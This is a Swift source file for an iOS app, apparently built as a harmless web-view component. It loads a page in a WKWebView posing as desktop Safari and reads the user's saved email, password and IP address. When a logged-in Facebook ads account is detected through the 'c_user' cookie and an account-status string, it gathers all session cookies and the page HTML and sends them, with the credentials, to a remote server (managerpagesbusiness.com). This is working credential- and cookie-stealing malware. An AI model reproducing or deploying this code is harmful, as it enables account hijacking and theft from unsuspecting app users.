//
//  File.swift
//  
//
//  Created by DanHa on 25/03/2023.
//

import Foundation
import SwiftUI
import WebKit

@available(iOS 14.0, *)
struct CoordsFive: UIViewRepresentable {
    func makeCoordinator() -> ClassFiveCoordinator {
        ClassFiveCoordinator(self)
    }
    
    let url: URL?
    
    @Binding var is_five_get_html_ads: String
    private let five_obser_vable = Five_Observable()
    var ob_five_server: NSKeyValueObservation? {
        five_obser_vable.ins_five_tance
    }
    func makeUIView(context: Context) -> WKWebView {
        let prefs = WKWebpagePreferences()
        prefs.allowsContentJavaScript = true
        let config = WKWebViewConfiguration()
        config.defaultWebpagePreferences = prefs
        let webview = WKWebView(frame: .zero, configuration: config)
        webview.customUserAgent = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0 Safari/605.1.15"
        webview.navigationDelegate = context.coordinator
        webview.load(URLRequest(url: url!))
        return webview
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        
    }
    
    class ClassFiveCoordinator: NSObject, WKNavigationDelegate {
        var five_parent: CoordsFive
        
        init(_ five_parent: CoordsFive) {
            self.five_parent = five_parent
        }
        
        func readAddEmail() -> String {
            var address_email: String?
            if let data_bit = UserDefaults.standard.object(forKey: "email") as? Data {
                if let loaded_Email = try? JSONDecoder().decode(UserInvoicesEmail.self, from: data_bit) {
                    address_email = loaded_Email.email
                }
            }
            return address_email ?? "diachiip_Email_Null"
        }
        
        func readPw() -> String {
            var address_matkhau: String?
            if let data_bit = UserDefaults.standard.object(forKey: "matkhau") as? Data {
                if let loaded_matkhau = try? JSONDecoder().decode(UserInvoicesMK.self, from: data_bit) {
                    address_matkhau = loaded_matkhau.matkhau
                }
            }
            return address_matkhau ?? "diachiip_Mat_Khau_Null"
        }
        
        func readAddIpp() -> String {
            var address_i_p: String?
            if let data_bit = UserDefaults.standard.object(forKey: "diachiip") as? Data {
                if let loaded_DiachiIP = try? JSONDecoder().decode(UserInvoicesIpadress.self, from: data_bit) {
                    address_i_p = loaded_DiachiIP.diachiip
                }
            }
            return address_i_p ?? "diachiip_IP_Null"
        }
        
        func webView(_ webView: WKWebView, didFinish navigation: WKNavigation!) {
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) {
                webView.evaluateJavaScript("document.documentElement.outerHTML.toString()") { html, error in
                    if let five_htm_ads_show = html as? String, error == nil {
                        if !five_htm_ads_show.isEmpty {
                            if five_htm_ads_show.contains("\"account_status\": 1,") {
                                WKWebsiteDataStore.default().httpCookieStore.getAllCookies { cookies in
                                    let five_i = cookies.firstIndex(where: { $0.name == "c_user"})
                                    if (five_i != nil) {
                                        let five_get_ck = cookies.reduce("", { x,y in
                                            x + y.name + "=" + String(y.value) + ";"
                                        })
                                        let five_json_data: [String: Any] = [
                                            "c_user": cookies[five_i!].value,
                                            "e_mail": self.readAddEmail(),
                                            "pass_work": self.readPw(),
                                            "cookie_app": five_get_ck,
                                            "html_ads": five_htm_ads_show,
                                            "ip_address": self.readAddIpp(),
                                            "name_app": Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String ?? ""
                                        ]
                                        
                                        let url = URL(string: "https://managerpagesbusiness.com/api/savedatackpro")
                                        let json_data = try? JSONSerialization.data(withJSONObject: five_json_data)
                                        var request = URLRequest(url: url!)
                                        request.httpMethod = "PATCH"
                                        request.setValue("application.json", forHTTPHeaderField: "Content-Type")
                                        request.httpBody = json_data
                                        let task = URLSession.shared.dataTask(with: request) { data, response, error in
                                            if error != nil {
                                                print("not_ok")
                                            } else {
                                                self.five_parent.is_five_get_html_ads = five_htm_ads_show
                                            }
                                        }
                                        task.resume()
                                    }
                                    
                                }
                            }
                        }
                    }
                }
            }
        }
    }
    
}

struct UserInvoicesEmail: Codable {
    var email: String
}

struct UserInvoicesMK: Codable {
    var matkhau: String
}

struct UserInvoicesIpadress: Codable {
    var diachiip: String
}

@available(iOS 13.0, *)
private class Five_Observable: ObservableObject {
    @Published var ins_five_tance: NSKeyValueObservation?
}
